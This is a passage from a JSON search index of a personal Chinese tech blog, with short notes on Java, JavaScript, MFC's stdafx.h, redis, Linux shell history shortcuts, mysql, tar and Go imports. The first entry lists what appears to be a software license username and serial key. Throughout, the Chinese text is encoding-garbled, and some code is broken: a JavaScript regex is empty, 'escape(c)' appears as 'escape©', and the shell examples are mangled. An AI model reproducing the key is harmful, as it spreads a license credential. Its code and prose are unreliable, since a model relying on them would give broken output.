","slug":"history/tech/5953c4d0c2b92f5665eed976","date":"2015-12-18T21:37:35.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed976/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed976/","excerpt":"","text":"ç”¨æˆ·åï¼šaxureuseråºåˆ—å·ï¼š8wFfIX7a8hHq6yAy6T8zCz5R0NBKeVxo9IKu+kgKh79FL6IyPD6lK7G6+tqEV4LG","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"axure","slug":"axure","permalink":"https://wangxiuwen.github.io/tags/axure/"}],"author":"wangxiuwen"},{"title":"è¿è¡ŒjaråŒ…","slug":"history/tech/5953c4d0c2b92f5665eed975","date":"2015-12-18T18:11:04.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed975/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed975/","excerpt":"","text":"java -jar xxx.jar","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"java","slug":"java","permalink":"https://wangxiuwen.github.io/tags/java/"}],"author":"wangxiuwen"},{"title":"Number æœ€å¤§å€¼","slug":"history/tech/5953c4d0c2b92f5665eed974","date":"2015-12-18T04:33:23.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed974/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed974/","excerpt":"","text":"Number.MAX_VALUE1.7976931348623157e+308","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"æ‰¹é‡ä¿®æ”¹æ–‡ä»¶åç¼€","slug":"history/tech/5953c4d0c2b92f5665eed972","date":"2015-12-17T03:33:56.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed972/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed972/","excerpt":"","text":"ren * *.mp4ren *.mp4 *.avi","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"cmd è„šæœ¬","slug":"cmd-è„šæœ¬","permalink":"https://wangxiuwen.github.io/tags/cmd-%E8%84%9A%E6%9C%AC/"}],"author":"wangxiuwen"},{"title":"JSè·å–å­—ç¬¦ä¸²é•¿åº¦ï¼Œæ±‰å­—ç®—ä¸¤ä¸ªå­—èŠ‚","slug":"history/tech/5953c4d0c2b92f5665eed971","date":"2015-12-17T03:30:33.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed971/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed971/","excerpt":"","text":"//ç¬¬ä¸€ç§GetLength = function(str){var realLength = 0;for (var i = 0; i &lt; str.length; i++){charCode = str.charCodeAt(i);if (charCode &gt;= 0 &amp;&amp; charCode &lt;= 128)realLength += 1;elserealLength += 2;}return realLength;}//ç¬¬äºŒç§ï¼ˆé‡‡å–å°†255æ„å¤–çš„å­—ç¬¦æ›¿æ¢æˆ&quot;aa&quot;çš„åšæ³•ï¼Œå–é•¿åº¦ï¼‰GetLength = function(str){return str.replace(//g,â€œaaâ€).length;};//ç¬¬ä¸‰ç§GetLength = function(s){var len = 0;for(var i=0; i&lt;s.length; i++){var c = s.substr(i,1);var ts = escapeÂ©;if(ts.substring(0,2) == â€œ%uâ€){len+=2;} else{len+=1;}}return len;}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"stdafx.h","slug":"history/tech/5953c4d0c2b92f5665eed970","date":"2015-12-17T02:51:19.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed970/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed970/","excerpt":"","text":"ç›®å½•http://my.oschina.net/u/1772925/blog/396347#OSC_h1_1http://my.oschina.net/u/1772925/blog/396347#OSC_h2_2http://my.oschina.net/u/1772925/blog/396347#OSC_h2_3http://my.oschina.net/u/1772925/blog/396347#OSC_h2_4stdafx.hVCå·¥ç¨‹é‡Œé¢ç»å¸¸è§åˆ°stdafx.hè¿™ä¸ªå¤´æ–‡ä»¶ï¼Œä»¥å‰ä¹Ÿæ²¡æœ‰ç‰¹åˆ«æ³¨æ„ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶ç”¨ä¸å¥½ç»å¸¸ä¼šå‡ºé”™ï¼Œæ‰€ä»¥å°±GOOGLEäº†ä¸€ä¸‹ï¼Œæ€»ç®—æ˜¯å¼„æ¸…æ¥šäº†ã€‚ã€‚ã€‚stdafxçš„è‹±æ–‡å…¨ç§°ä¸ºï¼šStandard Application Framework Extensionsï¼ˆæ ‡å‡†åº”ç”¨ç¨‹åºæ¡†æ¶çš„æ‰©å±•ï¼‰ã€‚æ‰€è°“å¤´æ–‡ä»¶é¢„ç¼–è¯‘ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªå·¥ç¨‹(Project)ä¸­ä½¿ç”¨çš„ä¸€äº›MFCæ ‡å‡†å¤´æ–‡ä»¶(å¦‚Windows.Hã€Afxwin.H)é¢„å…ˆç¼–è¯‘ï¼Œä»¥åè¯¥å·¥ç¨‹ç¼–è¯‘æ—¶ï¼Œä¸å†ç¼–è¯‘è¿™éƒ¨åˆ†å¤´æ–‡ä»¶ï¼Œä»…ä»…ä½¿ç”¨é¢„ç¼–è¯‘çš„ç»“æœã€‚è¿™æ ·å¯ä»¥åŠ å¿«ç¼–è¯‘é€Ÿåº¦ï¼ŒèŠ‚çœæ—¶é—´ã€‚ç®€ä»‹é¢„ç¼–è¯‘å¤´æ–‡ä»¶é€šè¿‡ç¼–è¯‘stdafx.cppç”Ÿæˆï¼Œä»¥å·¥ç¨‹åå‘½åï¼Œç”±äºé¢„ç¼–è¯‘çš„å¤´æ–‡ä»¶çš„åç¼€æ˜¯â€œpchâ€ï¼Œæ‰€ä»¥ç¼–è¯‘ç»“æœæ–‡ä»¶æ˜¯projectname.pchã€‚ç¼–è¯‘å™¨é€šè¿‡ä¸€ä¸ªå¤´æ–‡ä»¶stdafx.hæ¥ä½¿ç”¨é¢„ç¼–è¯‘å¤´æ–‡ä»¶ã€‚stdafx.hè¿™ä¸ªå¤´æ–‡ä»¶åæ˜¯å¯ä»¥åœ¨projectçš„ç¼–è¯‘è®¾ç½®é‡ŒæŒ‡å®šçš„ã€‚ç¼–è¯‘å™¨è®¤ä¸ºï¼Œæ‰€æœ‰åœ¨æŒ‡ä»¤#include &quot;stdafx.h&quot;å‰çš„ä»£ç éƒ½æ˜¯é¢„ç¼–è¯‘çš„ï¼Œå®ƒè·³è¿‡#include &quot;stdafx. h&quot;æŒ‡ä»¤ï¼Œä½¿ç”¨projectname.pchç¼–è¯‘è¿™æ¡æŒ‡ä»¤ä¹‹åçš„æ‰€æœ‰ä»£ç ã€‚å› æ­¤ï¼Œæ‰€æœ‰çš„MFCå®ç°æ–‡ä»¶ç¬¬ä¸€æ¡è¯­å¥éƒ½æ˜¯ï¼š#include â€œstdafx.hâ€ã€‚åœ¨å®ƒå‰é¢çš„æ‰€æœ‰ä»£ç å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥å…¶ä»–çš„å¤´æ–‡ä»¶åº”è¯¥åœ¨è¿™ä¸€è¡Œåé¢è¢«åŒ…å«ã€‚å¦åˆ™ï¼Œä½ å°†ä¼šå¾—åˆ°â€œNo such file or directoryâ€è¿™æ ·è®©ä½ ç™¾æ€ä¸å¾—å…¶è§£çš„é”™è¯¯æç¤ºã€‚ä½œç”¨stdafx.hä¸­æ²¡æœ‰å‡½æ•°åº“ï¼Œåªæ˜¯å®šä¹‰äº†ä¸€äº›ç¯å¢ƒå‚æ•°ï¼Œä½¿å¾—ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºèƒ½åœ¨32ä½çš„æ“ä½œç³»ç»Ÿç¯å¢ƒä¸‹è¿è¡Œã€‚Windowså’ŒMFCçš„includeæ–‡ä»¶éƒ½éå¸¸å¤§ï¼Œå³ä½¿æœ‰ä¸€ä¸ªå¿«é€Ÿçš„å¤„ç†ç¨‹åºï¼Œç¼–è¯‘ç¨‹åºä¹Ÿè¦èŠ±è´¹ç›¸å½“é•¿çš„æ—¶é—´æ¥å®Œæˆå·¥ä½œã€‚ç”±äºæ¯ä¸ª.CPPæ–‡ä»¶éƒ½åŒ…å«ç›¸åŒçš„includeæ–‡ä»¶ï¼Œä¸ºæ¯ä¸ª.CPPæ–‡ä»¶éƒ½é‡å¤å¤„ç†è¿™äº›æ–‡ä»¶å°±æ˜¾å¾—å¾ˆå‚»äº†ã€‚ä¸ºé¿å…è¿™ç§æµªè´¹ï¼ŒAppWizardå’ŒVisualCç¼–è¯‘ç¨‹åºä¸€èµ·è¿›è¡Œå·¥ä½œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š â—AppWizardå»ºç«‹äº†æ–‡ä»¶stdafx.hï¼Œè¯¥æ–‡ä»¶åŒ…å«äº†æ‰€æœ‰å½“å‰å·¥ç¨‹æ–‡ä»¶éœ€è¦çš„MFCincludeæ–‡ä»¶ã€‚ä¸”è¿™ä¸€æ–‡ä»¶å¯ä»¥éšè¢«é€‰æ‹©çš„é€‰é¡¹è€Œå˜åŒ–ã€‚ â—AppWizardç„¶åå°±å»ºç«‹Stdafx.cppã€‚è¿™ä¸ªæ–‡ä»¶é€šå¸¸éƒ½æ˜¯ä¸€æ ·çš„ã€‚ â—ç„¶åAppWizardå°±å»ºç«‹èµ·å·¥ç¨‹æ–‡ä»¶ï¼Œè¿™æ ·ç¬¬ä¸€ä¸ªè¢«ç¼–è¯‘çš„æ–‡ä»¶å°±æ˜¯stdafx.cppã€‚ â—å½“VisualCç¼–è¯‘stdafx.cppæ–‡ä»¶æ—¶ï¼Œå®ƒå°†ç»“æœä¿å­˜åœ¨ä¸€ä¸ªåä¸ºstdafx.pchçš„æ–‡ä»¶é‡Œã€‚(æ‰©å±•åpchè¡¨ç¤ºé¢„ç¼–è¯‘å¤´æ–‡ä»¶ã€‚) â—å½“VisualCç¼–è¯‘éšåçš„æ¯ä¸ª.cppæ–‡ä»¶æ—¶ï¼Œå®ƒé˜…è¯»å¹¶ä½¿ç”¨å®ƒåˆšç”Ÿæˆçš„.pchæ–‡ä»¶ã€‚VisualCä¸å†åˆ†æWindowsincludeæ–‡ä»¶ï¼Œé™¤éä½ åˆç¼–è¾‘äº†stdafx.cppæˆ–stdafx.hã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä½ å¿…é¡»éµå®ˆä»¥ä¸‹è§„åˆ™ï¼š â—ä½ ç¼–å†™çš„ä»»ä½•.cppæ–‡ä»¶éƒ½å¿…é¡»é¦–å…ˆåŒ…å«stdafx.hã€‚ â—å¦‚æœä½ æœ‰å·¥ç¨‹æ–‡ä»¶é‡Œçš„å¤§å¤šæ•°.cppæ–‡ä»¶éœ€è¦.hæ–‡ä»¶ï¼Œé¡ºä¾¿å°†å®ƒä»¬åŠ åœ¨stdafx.h(åéƒ¨)ä¸Šï¼Œç„¶åé¢„ç¼–è¯‘stdafx.cppã€‚ â—ç”±äº.pchæ–‡ä»¶å…·æœ‰å¤§é‡çš„ç¬¦å·ä¿¡æ¯ï¼Œå®ƒæ˜¯ä½ çš„å·¥ç¨‹æ–‡ä»¶é‡Œæœ€å¤§çš„æ–‡ä»¶ã€‚å¦‚æœä½ çš„ç£ç›˜ç©ºé—´æœ‰é™ï¼Œä½ å°±å¸Œæœ›èƒ½å°†è¿™ä¸ªä½ ä»æ²¡ä½¿ç”¨è¿‡çš„å·¥ç¨‹æ–‡ä»¶ä¸­çš„.pchæ–‡ä»¶åˆ é™¤ã€‚æ‰§è¡Œç¨‹åºæ—¶å¹¶ä¸éœ€è¦å®ƒä»¬ï¼Œä¸”éšç€å·¥ç¨‹æ–‡ä»¶çš„é‡æ–°å»ºç«‹ï¼Œå®ƒä»¬ä¹Ÿè‡ªåŠ¨åœ°é‡æ–°å»ºç«‹ã€‚åŸç† é€šä¿—ä¸€ç‚¹è¯´å½“æˆ‘ä»¬ä½¿ç”¨AppWizardæ¥è‡ªåŠ¨ç”ŸæˆæŸäº›é¡¹ç›®çš„æ—¶å€™,ç³»ç»Ÿä¼šè‡ªåŠ¨æŠŠæ‰€éœ€è¦includeçš„å¤´æ–‡ä»¶åœ¨stdafx.hä¸­å…ˆincludeä¸€ä¸‹,è¿™æ ·,æˆ‘ä»¬åªéœ€è¦ç›´æ¥includeè¿™ä¸ªstdafx.hæ–‡ä»¶å³å¯.å› ä¸ºåŒä¸€ä¸ªé¡¹ç›®ä¸­çš„ä¸åŒæºæ–‡ä»¶CPPéƒ½åŒ…å«ç›¸åŒçš„includeæ–‡ä»¶,è¿™æ ·,ä¸ºæ¯ä¸ª.CPPæ–‡ä»¶éƒ½é‡å¤includeè¿™äº›æ–‡ä»¶å°±æ˜¾å¾—å¾ˆå‚»äº†ã€‚å½“ç„¶å¦‚æœä½ ä¸ç”¨MFCçš„è¯å°±ä¸ç”¨äº†ã€‚å³ï¼šåœ¨æ¯ä¸ª.cppæ–‡ä»¶ä¸­éƒ½include stdafx.h å°±ç›¸å½“äºåŒ…å«äº†å…¶ä»–çš„å¦‚iostream.hç­‰æ–‡ä»¶","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"MFC","slug":"MFC","permalink":"https://wangxiuwen.github.io/tags/MFC/"}],"author":"wangxiuwen"},{"title":"sorted set","slug":"history/tech/5953c4d0c2b92f5665eed96f","date":"2015-12-17T02:05:15.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed96f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed96f/","excerpt":"","text":"0ä»£è¡¨ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œ -1 ä»£è¡¨æœ€åä¸€ä¸ªå…ƒç´ ï¼Œwithscores ä»£è¡¨æ’å…¥é¡ºåºzrange myset 0 -1 withscores","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"redis set ç±»å‹","slug":"history/tech/5953c4d0c2b92f5665eed96e","date":"2015-12-17T02:02:56.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed96e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed96e/","excerpt":"","text":"æ•°å­¦æ„ä¹‰ä¸Šçš„é›†åˆï¼Œæ¯”å¦‚è¯´å¤„ç†ä¸¤ä¸ªäººç›¸åŒå¥½å‹ï¼Œè®ºå›æ ‡ç­¾ç­‰åŠŸèƒ½","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"æŸ¥çœ‹redis ç«¯å£","slug":"history/tech/5953c4d0c2b92f5665eed96b","date":"2015-12-16T02:54:13.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed96b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed96b/","excerpt":"","text":"netstat -tunpl | grep 6379","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"redis æ•°æ®ç±»å‹ string","slug":"history/tech/5953c4d0c2b92f5665eed96d","date":"2015-12-15T18:36:19.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed96d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed96d/","excerpt":"","text":"string äºŒè¿›åˆ¶å®‰å…¨ï¼šset name qianrushisetnx name qianrushi //ä¸å­˜åœ¨åˆ™è®¾ç½®setex name 10 qianrushi//è®¾ç½®name ä¸ºqianrushi æœ‰æ•ˆæœŸä¸º10s","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"shell å¿«æ·é”®","slug":"history/tech/5953c4d0c2b92f5665eed96c","date":"2015-12-15T18:11:10.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed96c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed96c/","excerpt":"","text":"æ•´å¤©åœ¨shellç¯å¢ƒä¸‹æ“ä½œï¼Œä¸ç§¯ç´¯ç‚¹å¿«æ·è¾“å…¥çš„å°æŠ€å·§æ˜¯ä¸è¡Œçš„ã€‚æœ€å¸¸ç”¨çš„æŠ€å·§ææ€•å°±æ˜¯Tabè‡ªåŠ¨è¡¥å…¨ä»¥åŠä¸Šæ–¹å‘é”®æ¥å›é€€ä¸Šå‡ æ¡å†å²å‘½ä»¤äº†ï¼Œè¿™äº›å¯¹äºcshï¼Œbashï¼Œkshï¼Œzshéƒ½é€‚ç”¨ã€‚æœ€è¿‘è¿˜æ‰¾åˆ°ä¸€ç§å¿«é€Ÿå›é€€ä¸Šä¸€æ¡å†å²çš„ä¸€äº›å°æŠ€å·§ï¼Œæš‚è®°å½•ä¹‹ã€‚1ã€ é™¤äº†æ–¹å‘é”®ä¸Šï¼Œè¿˜å¯ä»¥ç”¨â€œ!!â€ä»£è¡¨ä¸Šä¸€æ¡è¾“å…¥çš„å‘½ä»¤ï¼Œç”¨è¿™ä¸ªçš„å¥½å¤„åœ¨äºå¯ä»¥å°†è¿™ä¸¤ä¸ªå­—ç¬¦æ”¾åœ¨å‘½ä»¤è¡Œä»»ä½•ä½ç½®ä»¥ä¾¿äºæ„æˆæ–°çš„å‘½ä»¤ã€‚ä¾‹å¦‚ï¼š./someâˆ’shellâˆ’command./some-shell-command./someâˆ’shellâˆ’commandcat !!åˆ™åä¸€æ¡å‘½ä»¤å°±ç›¸å½“äºcat ./some-shell-commandï¼Œè¿™æ ·åšæ¯”å…ˆæŒ‰æ–¹å‘é”®ä¸Šå›é€€ä¸€æ¡å‘½ä»¤ï¼Œç„¶åå®šä½åˆ°å¼€å§‹ï¼Œæ’å…¥catè¦å¿«æ·å¾—å¤šã€‚2ã€ é™¤äº†!!ï¼Œ!ä»£è¡¨å¾—æ˜¯ä¸Šä¸€æ¡å‘½ä»¤ä¸­æœ€åä¸€ä¸ªparameterï¼Œè¿™æ˜¯ä¸ªæ›´æœ‰ç”¨çš„å˜é‡ï¼Œä¾‹å¦‚ï¼š ls /some-path-to-a-directorycat!cat !cat!/some-file.txtå¦‚æœsome-path-to-a-directoryä¸å¹¸ä¸ºä¸€ä¸ªéå¸¸é•¿çš„è·¯å¾„çš„æ—¶å€™ï¼Œä½¿ç”¨!$æ°å¥½å°±èƒ½çœå»è¾“å…¥è¿™ä¸ªè¶…é•¿è·¯å¾„çš„éº»çƒ¦ï¼Œè¿™æ¡å‘½ä»¤å®é™… ä¸Šå°±ç›¸å½“äºcat /some-path-to-a-directory/some-file.txt3ã€ !strä»£è¡¨ä»¥å†å²å‘½ä»¤ä¸­æœ€è¿‘ä¸€æ¡ä»¥strå¼€å¤´çš„å‘½ä»¤ã€‚æ¯”å¦‚!ssh å°±æ˜¯æœ€åä¸€æ¬¡æ‰§è¡Œsshçš„å‘½ä»¤4ã€ !?str?ä»£è¡¨å†å²å‘½ä»¤ä¸­æœ€è¿‘ä¸€æ¡åŒ…å«strçš„å‘½ä»¤ã€‚5ã€ !nå’Œ!-nï¼Œå‰è€…ä»£è¡¨historyå‘½ä»¤æ˜¾ç¤ºå‡ºæ¥å‰é¢çš„æ¡ç›®æ•°ä¸ºnçš„é‚£æ¡å‘½ä»¤ï¼Œåè€…ä»£è¡¨å½“å‰å‘½ä»¤æ¡ç›®æ•°å‡å»nçš„é‚£æ¡å‘½ä»¤ï¼Œä¾‹å¦‚!-3å°±ä»£è¡¨3 æ¡å‰çš„é‚£ä¸ªå‘½ä»¤ã€‚å¯¹æ¯”èµ·æ¥ï¼Œ1å’Œ2æ˜¯ç›¸å½“å®ç”¨çš„ï¼Œå‰©ä¸‹3æ¡è®°å¾—ä½å°±ç”¨ï¼Œè®°ä¸ä½ä¹Ÿæ— å¦¨äº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"æŸ¥çœ‹ è¿æ¥åˆ—è¡¨","slug":"history/tech/5953c4d0c2b92f5665eed963","date":"2015-12-12T04:19:39.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed963/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed963/","excerpt":"","text":"show processlist;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"tar æ’é™¤æŸä¸ªç›®å½•","slug":"history/tech/5953c4d0c2b92f5665eed96a","date":"2015-12-12T03:15:51.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed96a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed96a/","excerpt":"","text":"tar -zcvf test.tar.gz --exclude=aa --exclude=bb test/*","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"go import ä¸‹åˆ’çº¿","slug":"history/tech/5953c4d0c2b92f5665eed969","date":"2015-12-12T00:01:20.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed969/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed969/","excerpt":"","text":"ä¸‹åˆ’çº¿ï¼šimport ä¸‹åˆ’çº¿ï¼ˆå¦‚ï¼šimport _ hello/impï¼‰çš„ä½œç”¨ï¼šå½“å¯¼å…¥ä¸€ä¸ªåŒ…æ—¶ï¼Œè¯¥åŒ…ä¸‹çš„æ–‡ä»¶é‡Œæ‰€æœ‰init()å‡½æ•°éƒ½ä¼šè¢«æ‰§è¡Œï¼Œç„¶è€Œï¼Œæœ‰äº›æ—¶å€™æˆ‘ä»¬å¹¶ä¸éœ€è¦æŠŠæ•´ä¸ªåŒ…éƒ½å¯¼å…¥è¿›æ¥ï¼Œä»…ä»…æ˜¯æ˜¯å¸Œæœ›å®ƒæ‰§è¡Œinit()å‡½æ•°è€Œå·²ã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨ import _ å¼•ç”¨è¯¥åŒ…ã€‚å³ä½¿ç”¨åªæ˜¯å¼•ç”¨è¯¥åŒ…ï¼Œä»…ä»…æ˜¯ä¸ºäº†è°ƒç”¨init()å‡½æ•°ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡åŒ…åæ¥è°ƒç”¨åŒ…ä¸­çš„å…¶ä»–å‡½æ•°ã€‚ç›®å½•ç»“æ„ï¼štest/main.gotest/hello/init.gomain.goï¼špackage mainimport _ â€œ./hello/â€func main() {}init.go:package helloimport â€œfmtâ€func init() {fmt.Println(â€œhello-init()â€)}func Print() {fmt.Println(â€œHello-Print!â€)}ç¼–è¯‘è¾“å‡ºï¼šC:/opt/Go/bin/go.exe build -iæˆåŠŸ: è¿›ç¨‹é€€å‡ºä»£ç  0.D:/workspace/test/test.exehello-init()æˆåŠŸ: è¿›ç¨‹é€€å‡ºä»£ç  0.ç‚¹æ“ä½œimport( â€œfmtâ€) è¿™ä¸ªç‚¹æ“ä½œçš„å«ä¹‰å°±æ˜¯è¿™ä¸ªåŒ…å¯¼å…¥ä¹‹ååœ¨ä½ è°ƒç”¨è¿™ä¸ªåŒ…çš„å‡½æ•°æ—¶ï¼Œä½ å¯ä»¥çœç•¥å‰ç¼€çš„åŒ…åï¼Œä¹Ÿå°±æ˜¯å‰é¢ä½ è°ƒç”¨çš„fmt.Println(â€œhello worldâ€)å¯ä»¥çœç•¥çš„å†™æˆPrintln(â€œhello worldâ€)åˆ«åæ“ä½œåˆ«åæ“ä½œé¡¾åæ€ä¹‰æˆ‘ä»¬å¯ä»¥æŠŠåŒ…å‘½åæˆå¦ä¸€ä¸ªæˆ‘ä»¬ç”¨èµ·æ¥å®¹æ˜“è®°å¿†çš„åå­—import( f â€œfmtâ€ ) åˆ«åæ“ä½œçš„è¯è°ƒç”¨åŒ…å‡½æ•°æ—¶å‰ç¼€å˜æˆäº†æˆ‘ä»¬çš„å‰ç¼€ï¼Œå³f.Println(â€œhello 